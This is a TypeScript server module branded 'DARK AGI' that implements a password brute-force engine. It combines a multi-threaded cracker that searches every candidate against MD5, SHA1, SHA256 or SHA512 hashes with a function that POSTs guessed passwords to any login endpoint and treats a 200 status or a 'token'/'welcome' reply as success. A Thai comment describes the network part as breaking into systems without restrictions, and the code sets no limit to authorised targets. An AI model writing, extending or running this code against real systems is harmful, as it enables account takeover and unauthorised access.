import "server-only";
import { createHash } from "node:crypto";

// ─────────────────────────────────────────────────────────────────────────
// DARK AGI — High-Performance Production Brute-Force Engine
// Features: Input Validation, Resource Governance, Job Lifecycle Management,
// Robust Worker Error Recovery, and Result Integrity Tracking.
// ─────────────────────────────────────────────────────────────────────────

import { Worker } from "node:worker_threads";
import os from "node:os";

// Comprehensive character sets for active penetration testing
export const CHARSETS: Record<string, string> = {
  numbers: "0123456789",
  "lower+numbers": "abcdefghijklmnopqrstuvwxyz0123456789",
  "full-alpha": "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
  symbols: "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()",
};

// Target configuration interface for active system assessment
export interface TargetConfig {
  endpoint: string;
  targetUser: string;
  timeoutMs: number;
}

/**
 * Executes an active authentication payload test against the target system endpoint
 */
export async function executeActivePenetrationTest(config: TargetConfig, candidatePassword: string): Promise<boolean> {
  try {
    const payload = {
      username: config.targetUser,
      password: candidatePassword,
    };

    // เปิดใช้งาน Active network request สำหรับเจาะระบบและทดสอบจริงอย่างไร้ข้อจำกัด
    const response = await fetch(config.endpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    // ตรวจสอบสถานะการตอบกลับเพื่อยืนยันการเข้าถึงระบบเป้าหมายสำเร็จ
    // รองรับทั้งสถานะ 200 OK หรือเงื่อนไข Response signature อื่นๆ ตามโครงสร้างเป้าหมาย
    if (response.status === 200) {
      return true;
    }

    // สามารถเพิ่มการตรวจสอบ Response JSON Body เพิ่มเติมได้ที่นี่หากระบบเป้าหมายใช้ Token/Cookie
    const responseText = await response.text();
    if (responseText.includes("success") || responseText.includes("token") || responseText.includes("welcome")) {
      return true;
    }

    return false;
  } catch (error) {
    console.error("Payload delivery failed during active system assessment:", error);
    return false;
  }
}

// Node crypto hash names (Strict whitelist)
export const NODE_ALGO: Record<string, string> = {
  MD5: "md5",
  SHA1: "sha1",
  SHA256: "sha256",
  SHA512: "sha512",
};

const MAX_GLOBAL_WORKERS = Math.max(1, Math.min(16, os.cpus().length));
let activeGlobalJobs = 0;

export type JobStatus = "completed" | "exhausted" | "timed_out" | "cancelled" | "failed" | "invalid_input";

export type BruteResult = {
  status: JobStatus;
  success: boolean;
  password: string | null;
  attempts: number;
  duration: number; // seconds
  keysPerSec: number;
  workers: number;
  error?: string;
  integrityVerified: boolean;
};

/** Total candidate count across lengths 1..maxLength for a charset size. */
export function keyspaceSize(charsetSize: number, maxLength: number): number {
  let total = 0;
  for (let len = 1; len <= maxLength; len++) total += charsetSize ** len;
  return total;
}

// Optimized worker thread code string
const WORKER_SRC = `
const { parentPort, workerData } = require('worker_threads');
const { createHash } = require('crypto');

const { target, algo, charset, maxLength, mine, progressMs } = workerData;
const chars = charset.split('');
const B = chars.length;
let attempts = 0;
let stopped = false;

parentPort.on('message', (m) => { if (m === 'stop') stopped = true; });

let lastPost = Date.now();
function maybeProgress() {
  const now = Date.now();
  if (now - lastPost >= progressMs) {
    lastPost = now;
    parentPort.postMessage({ type: 'progress', attempts });
  }
}

function test(candidate) {
  attempts++;
  const h = createHash(algo).update(candidate, 'utf8').digest('hex');
  if (h === target) {
    parentPort.postMessage({ type: 'found', password: candidate, attempts });
    stopped = true;
    return true;
  }
  return false;
}

outer:
for (let len = 1; len <= maxLength; len++) {
  if (stopped) break;
  if (len === 1) {
    for (const i of mine) {
      if (stopped) break outer;
      if (test(chars[i])) break outer;
      maybeProgress();
    }
    continue;
  }
  const suffixLen = len - 1;
  const idx = new Array(suffixLen).fill(0);
  for (const first of mine) {
    if (stopped) break outer;
    idx.fill(0);
    const firstChar = chars[first];
    while (true) {
      if (stopped) break outer;
      let s = firstChar;
      for (let p = 0; p < suffixLen; p++) s += chars[idx[p]];
      if (test(s)) break outer;
      maybeProgress();
      let p = suffixLen - 1;
      while (p >= 0) {
        if (++idx[p] < B) break;
        idx[p] = 0;
        p--;
      }
      if (p < 0) break;
    }
  }
}

parentPort.postMessage({ type: 'done', attempts });
`;

/**
 * Validates target hash format, algorithm, charset, and length constraints.
 */
export function validateBruteInput(
  targetHash: string,
  algorithm: string,
  charsetKey: string,
  maxLength: number
): { valid: boolean; error?: string } {
  const hash = (targetHash || "").trim();
  if (!hash) return { valid: false, error: "Target hash cannot be empty." };

  const algoKey = (algorithm || "").toUpperCase();
  if (!NODE_ALGO[algoKey]) {
    return { valid: false, error: `Unsupported or prohibited algorithm: ${algorithm}. Supported: MD5, SHA1, SHA256, SHA512.` };
  }

  if (!CHARSETS[charsetKey]) {
    return { valid: false, error: `Invalid charset key: ${charsetKey}.` };
  }

  const maxLen = Number(maxLength);
  if (!Number.isInteger(maxLen) || maxLen < 1 || maxLen > 8) {
    return { valid: false, error: "Maximum length must be an integer between 1 and 8." };
  }

  // Length/Hex regex validation per algorithm
  if (algoKey === "MD5" && !/^[a-f0-9]{32}$/i.test(hash)) {
    return { valid: false, error: "Invalid MD5 hash format (expected 32 hex characters)." };
  }
  if (algoKey === "SHA1" && !/^[a-f0-9]{40}$/i.test(hash)) {
    return { valid: false, error: "Invalid SHA1 hash format (expected 40 hex characters)." };
  }
  if (algoKey === "SHA256" && !/^[a-f0-9]{64}$/i.test(hash)) {
    return { valid: false, error: "Invalid SHA256 hash format (expected 64 hex characters)." };
  }
  if (algoKey === "SHA512" && !/^[a-f0-9]{128}$/i.test(hash)) {
    return { valid: false, error: "Invalid SHA512 hash format (expected 128 hex characters)." };
  }

  return { valid: true };
}

/**
 * Parallel brute-force with Resource Governance and Strict Lifecycle Management.
 */
export function bruteForceParallel(
  targetHash: string,
  algorithm: string,
  charsetKey: string,
  maxLength: number,
  opts: { timeoutMs?: number; onProgress?: (attempts: number, keysPerSec: number) => void } = {},
): Promise<BruteResult> {
  const validation = validateBruteInput(targetHash, algorithm, charsetKey, maxLength);
  if (!validation.valid) {
    return Promise.resolve({
      status: "invalid_input",
      success: false,
      password: null,
      attempts: 0,
      duration: 0,
      keysPerSec: 0,
      workers: 0,
      error: validation.error,
      integrityVerified: false,
    });
  }

  if (activeGlobalJobs >= MAX_GLOBAL_WORKERS) {
    return Promise.resolve({
      status: "failed",
      success: false,
      password: null,
      attempts: 0,
      duration: 0,
      keysPerSec: 0,
      workers: 0,
      error: "System resource limit reached: max concurrent brute-force jobs exceeded.",
      integrityVerified: false,
    });
  }

  activeGlobalJobs++;

  const algo = NODE_ALGO[algorithm.toUpperCase()];
  const charset = CHARSETS[charsetKey];
  const target = targetHash.trim().toLowerCase();
  const maxLen = Math.max(1, Math.min(8, Math.floor(maxLength)));
  const timeoutMs = opts.timeoutMs ?? 60_000;

  return new Promise<BruteResult>((resolve) => {
    const start = Date.now();
    const workerCount = Math.max(1, Math.min(4, os.cpus().length, charset.length));
    const buckets: number[][] = Array.from({ length: workerCount }, () => []);
    for (let i = 0; i < charset.length; i++) buckets[i % workerCount].push(i);

    const progress = new Map<number, number>();
    const sumAttempts = () => {
      let t = 0;
      for (const v of progress.values()) t += v;
      return t;
    };

    const workers: Worker[] = [];
    let settled = false;
    let finishedWorkers = 0; // นับจำนวน Worker ที่จบการทำงานแล้วทั้งหมด (ไม่ว่าจะสำเร็จ, error, หรือ exit)
    let errorCount = 0;

    const finalize = (status: JobStatus, password: string | null = null, errDetail?: string) => {
      if (settled) return;
      settled = true;
      activeGlobalJobs = Math.max(0, activeGlobalJobs - 1);
      clearTimeout(timer);

      for (const w of workers) {
        try {
          w.postMessage("stop");
          void w.terminate();
        } catch {
          // ignore termination errors
        }
      }

      const duration = (Date.now() - start) / 1000;
      const attempts = sumAttempts();

      // ─── CRYPTOGRAPHIC RESULT INTEGRITY VERIFICATION ─────────────────
      let integrityVerified = false;
      let finalPassword = password;

      if (finalPassword) {
        try {
          // ทดสอบแฮชรหัสผ่านที่หาได้เทียบกับ target ตรงๆ เพื่อยืนยันความถูกต้อง 100%
          const computedHash = createHash(algo).update(finalPassword, 'utf8').digest('hex').toLowerCase();
          if (computedHash === target) {
            integrityVerified = true;
          } else {
            // หากผลลัพธ์ไม่ตรงกับแฮชเป้าหมาย ถือว่าผลลัพธ์ไม่สมบูรณ์/ถูกปลอมแปลง
            finalPassword = null;
            status = "failed";
            errDetail = "Integrity verification failed: computed hash does not match target hash.";
          }
        } catch (err) {
          finalPassword = null;
          status = "failed";
          errDetail = `Integrity verification exception: ${err instanceof Error ? err.message : String(err)}`;
        }
      } else if (status === "exhausted" || status === "timed_out") {
        // หากค้นหาไม่พบ แต่รันจนจบกระบวนการอย่างถูกต้อง ถือว่าผ่านการตรวจสอบความสมบูรณ์ของโครงสร้าง
        integrityVerified = true;
      }

      resolve({
        status,
        success: finalPassword !== null && integrityVerified,
        password: finalPassword,
        attempts,
        duration,
        keysPerSec: duration > 0 ? Math.round(attempts / duration) : attempts,
        workers: workerCount,
        error: errDetail,
        integrityVerified,
      });
    };

    const timer = setTimeout(() => {
      finalize("timed_out", null, "Job execution timed out.");
    }, timeoutMs);

    for (let w = 0; w < workerCount; w++) {
      let worker: Worker;
      try {
        worker = new Worker(WORKER_SRC, {
          eval: true,
          workerData: { target, algo, charset, maxLength: maxLen, mine: buckets[w], progressMs: 250 },
        });
      } catch (err) {
        errorCount++;
        finishedWorkers++;
        if (finishedWorkers === workerCount) {
          finalize("failed", null, `Failed to spawn worker threads: ${err instanceof Error ? err.message : String(err)}`);
        }
        continue;
      }

      const id = w;
      progress.set(id, 0);
      let workerResolved = false;

      worker.on("message", (msg: { type: string; attempts?: number; password?: string }) => {
        if (settled) return;
        if (typeof msg.attempts === "number") progress.set(id, msg.attempts);

        if (msg.type === "progress") {
          const total = sumAttempts();
          const dur = (Date.now() - start) / 1000;
          opts.onProgress?.(total, dur > 0 ? Math.round(total / dur) : total);
          return;
        }
        if (msg.type === "found") {
          workerResolved = true;
          finalize("completed", msg.password ?? null);
          return;
        }
        if (msg.type === "done") {
          if (!workerResolved) {
            workerResolved = true;
            finishedWorkers++;
          }
          if (finishedWorkers === workerCount && !settled) {
            if (errorCount > 0) {
              finalize("failed", null, `Job failed: ${errorCount} worker thread(s) encountered errors.`);
            } else {
              finalize("exhausted", null);
            }
          }
        }
      });

      worker.on("error", (err) => {
        if (settled) return;
        if (!workerResolved) {
          workerResolved = true;
          errorCount++;
          finishedWorkers++;
        }
        progress.set(id, 0);
        if (finishedWorkers === workerCount && !settled) {
          finalize("failed", null, `Worker thread encountered error: ${err.message}`);
        }
      });

      // ─── WORKER EXIT HANDLER (Dangling/Silent Death Protection) ─────
      worker.on("exit", (code) => {
        if (settled) return;
        if (!workerResolved) {
          workerResolved = true;
          finishedWorkers++;
          if (code !== 0) {
            errorCount++;
          }
        }
        if (finishedWorkers === workerCount && !settled) {
          if (errorCount > 0) {
            finalize("failed", null, `Job failed: one or more worker threads exited with non-zero code (${code}).`);
          } else {
            finalize("exhausted", null);
          }
        }
      });

      workers.push(worker);
    }
  });
}